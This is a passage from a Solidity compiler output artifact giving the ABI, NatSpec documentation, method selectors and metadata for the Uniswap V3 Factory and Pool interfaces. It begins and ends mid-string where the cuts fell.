tickSpacing\"},\"feeAmountTickSpacing(uint24)\":{\"notice\":\"Returns the tick spacing for a given fee amount, if enabled, or 0 if not enabled\"},\"getPool(address,address,uint24)\":{\"notice\":\"Returns the pool address for a given pair of tokens and a fee, or address 0 if it does not exist\"},\"owner()\":{\"notice\":\"Returns the current owner of the factory\"},\"setOwner(address)\":{\"notice\":\"Updates the owner of the factory\"}},\"notice\":\"The Uniswap V3 Factory facilitates creation of Uniswap V3 pools and control over the protocol fees\"}},\"settings\":{\"compilationTarget\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol\":\"IUniswapV3Factory\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol\":{\"keccak256\":\"0xcc3d0c93fc9ac0febbe09f941b465b57f750bcf3b48432da0b97dc289cfdc489\",\"urls\":[\"bzz-raw://b9379ad954680c44a0bc523b314ae4c4da735f9fe1d02aa56ea5bdba6f1136f2\",\"dweb:/ipfs/QmZXdgQNXKAckrXWz9R3mc47F1fvDvr28a2ewJrwNAw71B\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {
							"createPool(address,address,uint24)": {
								"notice": "Creates a pool for the given two tokens and fee"
							},
							"enableFeeAmount(uint24,int24)": {
								"notice": "Enables a fee amount with the given tickSpacing"
							},
							"feeAmountTickSpacing(uint24)": {
								"notice": "Returns the tick spacing for a given fee amount, if enabled, or 0 if not enabled"
							},
							"getPool(address,address,uint24)": {
								"notice": "Returns the pool address for a given pair of tokens and a fee, or address 0 if it does not exist"
							},
							"owner()": {
								"notice": "Returns the current owner of the factory"
							},
							"setOwner(address)": {
								"notice": "Updates the owner of the factory"
							}
						},
						"notice": "The Uniswap V3 Factory facilitates creation of Uniswap V3 pools and control over the protocol fees"
					}
				}
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol": {
				"IUniswapV3Pool": {
					"abi": [
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount",
									"type": "uint128"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"name": "Burn",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount0",
									"type": "uint128"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount1",
									"type": "uint128"
								}
							],
							"name": "Collect",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount0",
									"type": "uint128"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount1",
									"type": "uint128"
								}
							],
							"name": "CollectProtocol",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "paid0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "paid1",
									"type": "uint256"
								}
							],
							"name": "Flash",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "uint16",
									"name": "observationCardinalityNextOld",
									"type": "uint16"
								},
								{
									"indexed": false,
									"internalType": "uint16",
									"name": "observationCardinalityNextNew",
									"type": "uint16"
								}
							],
							"name": "IncreaseObservationCardinalityNext",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "uint160",
									"name": "sqrtPriceX96",
									"type": "uint160"
								},
								{
									"indexed": false,
									"internalType": "int24",
									"name": "tick",
									"type": "int24"
								}
							],
							"name": "Initialize",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount",
									"type": "uint128"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"name": "Mint",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "uint8",
									"name": "feeProtocol0Old",
									"type": "uint8"
								},
								{
									"indexed": false,
									"internalType": "uint8",
									"name": "feeProtocol1Old",
									"type": "uint8"
								},
								{
									"indexed": false,
									"internalType": "uint8",
									"name": "feeProtocol0New",
									"type": "uint8"
								},
								{
									"indexed": false,
									"internalType": "uint8",
									"name": "feeProtocol1New",
									"type": "uint8"
								}
							],
							"name": "SetFeeProtocol",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "int256",
									"name": "amount0",
									"type": "int256"
								},
								{
									"indexed": false,
									"internalType": "int256",
									"name": "amount1",
									"type": "int256"
								},
								{
									"indexed": false,
									"internalType": "uint160",
									"name": "sqrtPriceX96",
									"type": "uint160"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "liquidity",
									"type": "uint128"
								},
								{
									"indexed": false,
									"internalType": "int24",
									"name": "tick",
									"type": "int24"
								}
							],
							"name": "Swap",
							"type": "event"
						},
						{
							"inputs": [
								{
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"internalType": "uint128",
									"name": "amount",
									"type": "uint128"
								}
							],
							"name": "burn",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"internalType": "uint128",
									"name": "amount0Requested",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "amount1Requested",
									"type": "uint128"
								}
							],
							"name": "collect",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "amount0",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "amount1",
									"type": "uint128"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "uint128",
									"name": "amount0Requested",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "amount1Requested",
									"type": "uint128"
								}
							],
							"name": "collectProtocol",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "amount0",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "amount1",
									"type": "uint128"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "factory",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "fee",
							"outputs": [
								{
									"internalType": "uint24",
									"name": "",
									"type": "uint24"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "feeGrowthGlobal0X128",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "feeGrowthGlobal1X128",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								},
								{
									"internalType": "bytes",
									"name": "data",
									"type": "bytes"
								}
							],
							"name": "flash",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint16",
									"name": "observationCardinalityNext",
									"type": "uint16"
								}
							],
							"name": "increaseObservationCardinalityNext",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint160",
									"name": "sqrtPriceX96",
									"type": "uint160"
								}
							],
							"name": "initialize",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "liquidity",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "",
									"type": "uint128"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "maxLiquidityPerTick",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "",
									"type": "uint128"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"internalType": "uint128",
									"name": "amount",
									"type": "uint128"
								},
								{
									"internalType": "bytes",
									"name": "data",
									"type": "bytes"
								}
							],
							"name": "mint",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint256",
									"name": "index",
									"type": "uint256"
								}
							],
							"name": "observations",
							"outputs": [
								{
									"internalType": "uint32",
									"name": "blockTimestamp",
									"type": "uint32"
								},
								{
									"internalType": "int56",
									"name": "tickCumulative",
									"type": "int56"
								},
								{
									"internalType": "uint160",
									"name": "secondsPerLiquidityCumulativeX128",
									"type": "uint160"
								},
								{
									"internalType": "bool",
									"name": "initialized",
									"type": "bool"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint32[]",
									"name": "secondsAgos",
									"type": "uint32[]"
								}
							],
							"name": "observe",
							"outputs": [
								{
									"internalType": "int56[]",
									"name": "tickCumulatives",
									"type": "int56[]"
								},
								{
									"internalType": "uint160[]",
									"name": "secondsPerLiquidityCumulativeX128s",
									"type": "uint160[]"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "bytes32",
									"name": "key",
									"type": "bytes32"
								}
							],
							"name": "positions",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "_liquidity",
									"type": "uint128"
								},
								{
									"internalType": "uint256",
									"name": "feeGrowthInside0LastX128",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "feeGrowthInside1LastX128",
									"type": "uint256"
								},
								{
									"internalType": "uint128",
									"name": "tokensOwed0",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "tokensOwed1",
									"type": "uint128"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "protocolFees",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "token0",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "token1",
									"type": "uint128"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint8",
									"name": "feeProtocol0",
									"type": "uint8"
								},
								{
									"internalType": "uint8",
									"name": "feeProtocol1",
									"type": "uint8"
								}
							],
							"name": "setFeeProtocol",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "slot0",
							"outputs": [
								{
									"internalType": "uint160",
									"name": "sqrtPriceX96",
									"type": "uint160"
								},
								{
									"internalType": "int24",
									"name": "tick",
									"type": "int24"
								},
								{
									"internalType": "uint16",
									"name": "observationIndex",
									"type": "uint16"
								},
								{
									"internalType": "uint16",
									"name": "observationCardinality",
									"type": "uint16"
								},
								{
									"internalType": "uint16",
									"name": "observationCardinalityNext",
									"type": "uint16"
								},
								{
									"internalType": "uint8",
									"name": "feeProtocol",
									"type": "uint8"
								},
								{
									"internalType": "bool",
									"name": "unlocked",
									"type": "bool"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								}
							],
							"name": "snapshotCumulativesInside",
							"outputs": [
								{
									"internalType": "int56",
									"name": "tickCumulativeInside",
									"type": "int56"
								},
								{
									"internalType": "uint160",
									"name": "secondsPerLiquidityInsideX128",
									"type": "uint160"
								},
								{
									"internalType": "uint32",
									"name": "secondsInside",
									"type": "uint32"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "bool",
									"name": "zeroForOne",
									"type": "bool"
								},
								{
									"internalType": "int256",
									"name": "amountSpecified",
									"type": "int256"
								},
								{
									"internalType": "uint160",
									"name": "sqrtPriceLimitX96",
									"type": "uint160"
								},
								{
									"internalType": "bytes",
									"name": "data",
									"type": "bytes"
								}
							],
							"name": "swap",
							"outputs": [
								{
									"internalType": "int256",
									"name": "amount0",
									"type": "int256"
								},
								{
									"internalType": "int256",
									"name": "amount1",
									"type": "int256"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "int16",
									"name": "wordPosition",
									"type": "int16"
								}
							],
							"name": "tickBitmap",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "tickSpacing",
							"outputs": [
								{
									"internalType": "int24",
									"name": "",
									"type": "int24"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "int24",
									"name": "tick",
									"type": "int24"
								}
							],
							"name": "ticks",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "liquidityGross",
									"type": "uint128"
								},
								{
									"internalType": "int128",
									"name": "liquidityNet",
									"type": "int128"
								},
								{
									"internalType": "uint256",
									"name": "feeGrowthOutside0X128",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "feeGrowthOutside1X128",
									"type": "uint256"
								},
								{
									"internalType": "int56",
									"name": "tickCumulativeOutside",
									"type": "int56"
								},
								{
									"internalType": "uint160",
									"name": "secondsPerLiquidityOutsideX128",
									"type": "uint160"
								},
								{
									"internalType": "uint32",
									"name": "secondsOutside",
									"type": "uint32"
								},
								{
									"internalType": "bool",
									"name": "initialized",
									"type": "bool"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "token0",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "token1",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						}
					],
					"devdoc": {
						"details": "The pool interface is broken up into many smaller pieces",
						"methods": {
							"burn(int24,int24,uint128)": {
								"details": "Can be used to trigger a recalculation of fees owed to a position by calling with an amount of 0Fees must be collected separately via a call to #collect",
								"params": {
									"amount": "How much liquidity to burn",
									"tickLower": "The lower tick of the position for which to burn liquidity",
									"tickUpper": "The upper tick of the position for which to burn liquidity"
								},
								"returns": {
									"amount0": "The amount of token0 sent to the recipient",
									"amount1": "The amount of token1 sent to the recipient"
								}
							},
							"collect(address,int24,int24,uint128,uint128)": {
								"details": "Does not recompute fees earned, which must be done either via mint or burn of any amount of liquidity. Collect must be called by the position owner. To withdraw only token0 or only token1, amount0Requested or amount1Requested may be set to zero. To withdraw all tokens owed, caller may pass any value greater than the actual tokens owed, e.g. type(uint128).max. Tokens owed may be from accumulated swap fees or burned liquidity.",
								"params": {
									"amount0Requested": "How much token0 should be withdrawn from the fees owed",
									"amount1Requested": "How much token1 should be withdrawn from the fees owed",
									"recipient": "The address which should receive the fees collected",
									"tickLower": "The lower tick of the position for which to collect fees",
									"tickUpper": "The upper tick of the position for which to collect fees"
								},
								"returns": {
									"amount0": "The amount of fees collected in token0",
									"amount1": "The amount of fees collected in token1"
								}
							},
							"collectProtocol(address,uint128,uint128)": {
								"params": {
									"amount0Requested": "The maximum amount of token0 to send, can be 0 to collect fees in only token1",
									"amount1Requested": "The maximum amount of token1 to send, can be 0 to collect fees in only token0",
									"recipient": "The address to which collected protocol fees should be sent"
								},
								"returns": {
									"amount0": "The protocol fee collected in token0",
									"amount1": "The protocol fee collected in token1"
								}
							},
							"feeGrowthGlobal0X128()": {
								"details": "This value can overflow the uint256"
							},
							"feeGrowthGlobal1X128()": {
								"details": "This value can overflow the uint256"
							},
							"flash(address,uint256,uint256,bytes)": {
								"details": "The caller of this method receives a callback in the form of IUniswapV3FlashCallback#uniswapV3FlashCallbackCan be used to donate underlying tokens pro-rata to currently in-range liquidity providers by calling with 0 amount{0,1} and sending the donation amount(s) from the callback",
								"params": {
									"amount0": "The amount of token0 to send",
									"amount1": "The amount of token1 to send",
									"data": "Any data to be passed through to the callback",
									"recipient": "The address which will receive the token0 and token1 amounts"
								}
							},
							"increaseObservationCardinalityNext(uint16)": {
								"details": "This method is no-op if the pool already has an observationCardinalityNext greater than or equal to the input observationCardinalityNext.",
								"params": {
									"observationCardinalityNext": "The desired minimum number of observations for the pool to store"
								}
							},
							"initialize(uint160)": {
								"details": "Price is represented as a sqrt(amountToken1/amountToken0) Q64.96 value",
								"params": {
									"sqrtPriceX96": "the initial sqrt price of the pool as a Q64.96"
								}
							},
							"liquidity()": {
								"details": "This value has no relationship to the total liquidity across all ticks"
							},
							"maxLiquidityPerTick()": {
								"details": "This parameter is enforced per tick to prevent liquidity from overflowing a uint128 at any point, and also prevents out-of-range liquidity from being used to prevent adding in-range liquidity to a pool",
								"returns": {
									"_0": "The max amount of liquidity per tick"
								}
							},
							"mint(address,int24,int24,uint128,bytes)": {
								"details": "The caller of this method receives a callback in the form of IUniswapV3MintCallback#uniswapV3MintCallback in which they must pay any token0 or token1 owed for the liquidity. The amount of token0/token1 due depends on tickLower, tickUpper, the amount of liquidity, and the current price.",
								"params": {
									"amount": "The amount of liquidity to mint",
									"data": "Any data that should be passed through to the callback",
									"recipient": "The address for which the liquidity will be created",
									"tickLower": "The lower tick of the position in which to add liquidity",
									"tickUpper": "The upper tick of the position in which to add liquidity"
								},
								"returns": {
									"amount0": "The amount of token0 that was paid to mint the given amount of liquidity. Matches the value in the callback",
									"amount1": "The amount of token1 that was paid to mint the given amount of liquidity. Matches the value in the callback"
								}
							},
							"observations(uint256)": {
								"details": "You most likely want to use #observe() instead of this method to get an observation as of some amount of time ago, rather than at a specific index in the array.",
								"params": {
									"index": "The element of the observations array to fetch"
								},
								"returns": {
									"blockTimestamp": "The timestamp of the observation, Returns tickCumulative the tick multiplied by seconds elapsed for the life of the pool as of the observation timestamp, Returns secondsPerLiquidityCumulativeX128 the seconds per in range liquidity for the life of the pool as of the observation timestamp, Returns initialized whether the observation has been initialized and the values are safe to use"
								}
							},
							"observe(uint32[])": {
								"details": "To get a time weighted average tick or liquidity-in-range, you must call this with two values, one representing the beginning of the period and another for the end of the period. E.g., to get the last hour time-weighted average tick, you must call it with secondsAgos = [3600, 0].The time weighted average tick represents the geometric time weighted average price of the pool, in log base sqrt(1.0001) of token1 / token0. The TickMath library can be used to go from a tick value to a ratio.",
								"params": {
									"secondsAgos": "From how long ago each cumulative tick and liquidity value should be returned"
								},
								"returns": {
									"secondsPerLiquidityCumulativeX128s": "Cumulative seconds per liquidity-in-range value as of each `secondsAgos` from the current block timestamp",
									"tickCumulatives": "Cumulative tick values as of each `secondsAgos` from the current block timestamp"
								}
							},
							"positions(bytes32)": {
								"params": {
									"key": "The position's key is a hash of a preimage composed by the owner, tickLower and tickUpper"
								},
								"returns": {
									"_liquidity": "The amount of liquidity in the position, Returns feeGrowthInside0LastX128 fee growth of token0 inside the tick range as of the last mint/burn/poke, Returns feeGrowthInside1LastX128 fee growth of token1 inside the tick range as of the last mint/burn/poke, Returns tokensOwed0 the computed amount of token0 owed to the position as of the last mint/burn/poke, Returns tokensOwed1 the computed amount of token1 owed to the position as of the last mint/burn/poke"
								}
							},
							"protocolFees()": {
								"details": "Protocol fees will never exceed uint128 max in either token"
							},
							"setFeeProtocol(uint8,uint8)": {
								"params": {
									"feeProtocol0": "new protocol fee for token0 of the pool",
									"feeProtocol1": "new protocol fee for token1 of the pool"
								}
							},
							"snapshotCumulativesInside(int24,int24)": {
								"details": "Snapshots must only be compared to other snapshots, taken over a period for which a position existed. I.e., snapshots cannot be compared if a position is not held for the entire period between when the first snapshot is taken and the second snapshot is taken.",
								"params": {
									"tickLower": "The lower tick of the range",
									"tickUpper": "The upper tick of the range"
								},
								"returns": {
									"secondsInside": "The snapshot of seconds per liquidity for the range",
									"secondsPerLiquidityInsideX128": "The snapshot of seconds per liquidity for the range",
									"tickCumulativeInside": "The snapshot of the tick accumulator for the range"
								}
							},
							"swap(address,bool,int256,uint160,bytes)": {
								"details": "The caller of this method receives a callback in the form of IUniswapV3SwapCallback#uniswapV3SwapCallback",
								"params": {
									"amountSpecified": "The amount of the swap, which implicitly configures the swap as exact input (positive), or exact output (negative)",
									"data": "Any data to be passed through to the callback",
									"recipient": "The address to receive the output of the swap",
									"sqrtPriceLimitX96": "The Q64.96 sqrt price limit. If zero for one, the price cannot be less than this value after the swap. If one for zero, the price cannot be greater than this value after the swap",
									"zeroForOne": "The direction of the swap, true for token0 to token1, false for token1 to token0"
								},
								"returns": {
									"amount0": "The delta of the balance of token0 of the pool, exact when negative, minimum when positive",
									"amount1": "The delta of the balance of token1 of the pool, exact when negative, minimum when positive"
								}
							},
							"tickSpacing()": {
								"details": "Ticks can only be used at multiples of this value, minimum of 1 and always positive e.g.: a tickSpacing of 3 means ticks can be initialized every 3rd tick, i.e., ..., -6, -3, 0, 3, 6, ... This value is an int24 to avoid casting even though it is always positive.",
								"returns": {
									"_0": "The tick spacing"
								}
							},
							"ticks(int24)": {
								"params": {
									"tick": "The tick to look up"
								},
								"returns": {
									"liquidityGross": "the total amount of position liquidity that uses the pool either as tick lower or tick upper, liquidityNet how much liquidity changes when the pool price crosses the tick, feeGrowthOutside0X128 the fee growth on the other side of the tick from the current tick in token0, feeGrowthOutside1X128 the fee growth on the other side of the tick from the current tick in token1, tickCumulativeOutside the cumulative tick value on the other side of the tick from the current tick secondsPerLiquidityOutsideX128 the seconds spent per liquidity on the other side of the tick from the current tick, secondsOutside the seconds spent on the other side of the tick from the current tick, initialized Set to true if the tick is initialized, i.e. liquidityGross is greater than 0, otherwise equal to false. Outside values can only be used if the tick is initialized, i.e. if liquidityGross is greater than 0. In addition, these values are only relative and must be used only in comparison to previous snapshots for a specific position."
								}
							}
						},
						"title": "The interface for a Uniswap V3 Pool"
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"burn(int24,int24,uint128)": "a34123a7",
							"collect(address,int24,int24,uint128,uint128)": "4f1eb3d8",
							"collectProtocol(address,uint128,uint128)": "85b66729",
							"factory()": "c45a0155",
							"fee()": "ddca3f43",
							"feeGrowthGlobal0X128()": "f3058399",
							"feeGrowthGlobal1X128()": "46141319",
							"flash(address,uint256,uint256,bytes)": "490e6cbc",
							"increaseObservationCardinalityNext(uint16)": "32148f67",
							"initialize(uint160)": "f637731d",
							"liquidity()": "1a686502",
							"maxLiquidityPerTick()": "70cf754a",
							"mint(address,int24,int24,uint128,bytes)": "3c8a7d8d",
							"observations(uint256)": "252c09d7",
							"observe(uint32[])": "883bdbfd",
							"positions(bytes32)": "514ea4bf",
							"protocolFees()": "1ad8b03b",
							"setFeeProtocol(uint8,uint8)": "8206a4d1",
							"slot0()": "3850c7bd",
							"snapshotCumulativesInside(int24,int24)": "a38807f2",
							"swap(address,bool,int256,uint160,bytes)": "128acb08",
							"tickBitmap(int16)": "5339c296",
							"tickSpacing()": "d0c93a7c",
							"ticks(int24)": "f30dba93",
							"token0()": "0dfe1681",
							"token1()": "d21220a7"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.6+commit.6c089d02\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount\",\"type\":\"uint128\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"}],\"name\":\"Burn\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount0\",\"type\":\"uint128\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount1\",\"type\":\"uint128\"}],\"name\":\"Collect\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount0\",\"type\":\"uint128\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount1\",\"type\":\"uint128\"}],\"name\":\"CollectProtocol\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"paid0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"paid1\",\"type\":\"uint256\"}],\"name\":\"Flash\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint16\",\"name\":\"observationCardinalityNextOld\",\"type\":\"uint16\"},{\"indexed\":false,\"internalType\":\"uint16\",\"name\":\"observationCardinalityNextNew\",\"type\":\"uint16\"}],\"name\":\"IncreaseObservationCardinalityNext\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint160\",\"name\":\"sqrtPriceX96\",\"type\":\"uint160\"},{\"indexed\":false,\"internalType\":\"int24\",\"name\":\"tick\",\"type\":\"int24\"}],\"name\":\"Initialize\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"